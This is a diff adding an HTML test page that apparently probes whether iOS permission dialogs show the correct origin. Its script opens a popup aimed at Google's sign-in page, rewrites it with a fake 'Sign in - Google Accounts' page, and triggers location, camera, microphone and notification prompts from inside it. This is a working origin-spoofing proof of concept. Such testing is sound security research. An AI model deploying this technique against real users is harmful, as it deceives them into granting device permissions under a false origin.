@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Permission Prompt Origin Test</title>
+<style>
+body{font-family:-apple-system,sans-serif;max-width:480px;margin:0 auto;padding:24px 16px;background:#fff;color:#1d1d1f}
+h2{font-size:18px;margin-bottom:8px}
+p{font-size:14px;color:#666;line-height:1.5;margin-bottom:16px}
+button{display:block;width:100%;padding:16px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;margin-bottom:10px}
+button:active{opacity:.7}
+.warn{font-size:12px;color:#ff3b30;margin-bottom:14px}
+</style>
+</head>
+<body>
+<h2>Permission Prompt Origin</h2>
+<p>Opens the empty-origin popup, then triggers permission prompts from inside it. Check what origin the iOS system dialog shows.</p>
+<div class="warn">If the permission dialog shows NO origin or a wrong origin, that's a security bug (user can't make informed consent).</div>
+
+<button onclick="run('geo')">Click me — Location prompt</button>
+<button onclick="run('cam')" style="background:#34c759">Click me — Camera prompt</button>
+<button onclick="run('mic')" style="background:#ff9500">Click me — Microphone prompt</button>
+<button onclick="run('notif')" style="background:#af52de">Click me — Notification prompt</button>
+
+<script>
+function run(type){
+  var a=document.createElement('a');
+  a.href='https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn';
+  a.target='perm_'+type;
+  a.style.display='none';
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  setTimeout(function(){
+    var w=window.open('','perm_'+type);
+    if(!w)return;
+    var js='';
+    if(type==='geo') js='navigator.geolocation.getCurrentPosition(function(p){document.title="Got: "+p.coords.latitude},function(e){document.title="Denied: "+e.message})';
+    if(type==='cam') js='navigator.mediaDevices.getUserMedia({video:true}).then(function(s){document.title="Got camera";s.getTracks().forEach(function(t){t.stop()})}).catch(function(e){document.title="Denied: "+e.message})';
+    if(type==='mic') js='navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){document.title="Got mic";s.getTracks().forEach(function(t){t.stop()})}).catch(function(e){document.title="Denied: "+e.message})';
+    if(type==='notif') js='Notification.requestPermission().then(function(r){document.title="Notif: "+r})';
+    w.document.open();
+    w.document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title></head><body style="font-family:-apple-system,sans-serif;background:#fff;text-align:center;padding:40px 24px"><div style="font-size:24px;margin-bottom:8px"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div><p style="color:#5f6368;font-size:14px">Requesting permission...</p><scr'+'ipt>'+js+'<\/scr'+'ipt></body></html>');
+    w.document.close();
+    w.stop();
+  },50);
+}
+</script>
+</body>
+</html>
